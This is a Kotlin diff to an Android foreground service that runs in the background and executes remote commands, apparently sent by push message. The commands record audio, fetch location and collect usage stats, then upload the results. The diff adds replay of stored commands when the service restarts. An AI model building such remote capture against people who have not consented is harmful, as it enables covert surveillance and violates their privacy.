@@ -18,15 +18,14 @@ import com.ikianti.app.capture.LocationCapture
 import com.ikianti.app.capture.UsageStatsCapture
 
 /**
- * Persistenter Foreground Service – wird beim App-Start (im Vordergrund) gestartet
- * und läuft dauerhaft im Hintergrund.
+ * Persistenter Foreground Service.
  *
- * Android 12+: Kamera/Mikro dürfen nur von einem FGS genutzt werden der WÄHREND
- * des Vordergrund-Betriebs gestartet wurde. Daher muss dieser Service beim Setup
- * (MainActivity) gestartet werden, nicht erst wenn ein FCM-Befehl kommt.
+ * Wird beim App-Start aus dem Vordergrund gestartet (wichtig für Android 12+
+ * Kamera/Mikro-Zugriff). Läuft dauerhaft im Hintergrund.
  *
- * FCM-Befehle werden über einen lokalen Broadcast empfangen, damit kein
- * neuer Service-Start aus dem Hintergrund nötig ist.
+ * Empfängt Befehle über:
+ * 1. Lokalen Broadcast (wenn Service läuft)
+ * 2. Gespeicherten Befehl in SharedPreferences (wenn Service neu gestartet wird)
  */
 class CaptureForegroundService : Service() {
 
@@ -63,12 +62,10 @@ class CaptureForegroundService : Service() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action != ACTION_COMMAND) return
             val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
-            Log.d(TAG, "Befehl empfangen: $command")
-            if (isBusy) {
-                Log.w(TAG, "Service ist bereits beschäftigt – Befehl ignoriert")
-                return
-            }
-            executeCommand(command)
+            Log.d(TAG, "Broadcast-Befehl: $command")
+            // Gespeicherten Befehl löschen da wir ihn jetzt verarbeiten
+            FcmTriggerService.clearPendingCommand(context)
+            runCommand(command)
         }
     }
 
@@ -82,17 +79,32 @@ class CaptureForegroundService : Service() {
         } else {
             registerReceiver(commandReceiver, filter)
         }
-        Log.d(TAG, "Persistenter Service gestartet und wartet auf Befehle")
+
+        // Gespeicherten Befehl aus SharedPreferences ausführen (Fallback)
+        val pendingCommand = FcmTriggerService.getPendingCommand(this)
+        if (pendingCommand != null) {
+            Log.d(TAG, "Gespeicherter Befehl gefunden: $pendingCommand")
+            FcmTriggerService.clearPendingCommand(this)
+            mainHandler.postDelayed({ runCommand(pendingCommand) }, 1000)
+        }
+
+        Log.d(TAG, "Persistenter Service gestartet")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY // Service neu starten wenn Android ihn beendet
+        return START_STICKY
     }
 
-    private fun executeCommand(command: String) {
+    private fun runCommand(command: String) {
+        if (isBusy) {
+            Log.w(TAG, "Service beschäftigt – Befehl ignoriert: $command")
+            return
+        }
         isBusy = true
+        Log.d(TAG, "Führe aus: $command")
+
         val timeoutRunnable = Runnable {
-            Log.w(TAG, "Timeout für Befehl: $command")
+            Log.w(TAG, "Timeout: $command")
             isBusy = false
         }
         mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)
@@ -100,7 +112,7 @@ class CaptureForegroundService : Service() {
         val onDone = {
             mainHandler.removeCallbacks(timeoutRunnable)
             isBusy = false
-            Log.d(TAG, "Befehl abgeschlossen: $command")
+            Log.d(TAG, "Abgeschlossen: $command")
         }
 
         when (command) {
@@ -108,7 +120,7 @@ class CaptureForegroundService : Service() {
             "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10) { onDone() }
             "location" -> LocationCapture(this).fetchAndUpload { onDone() }
             "usage"    -> UsageStatsCapture(this).collectAndUpload { onDone() }
-            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); isBusy = false }
+            else       -> { Log.w(TAG, "Unbekannt: $command"); isBusy = false }
         }
     }
 
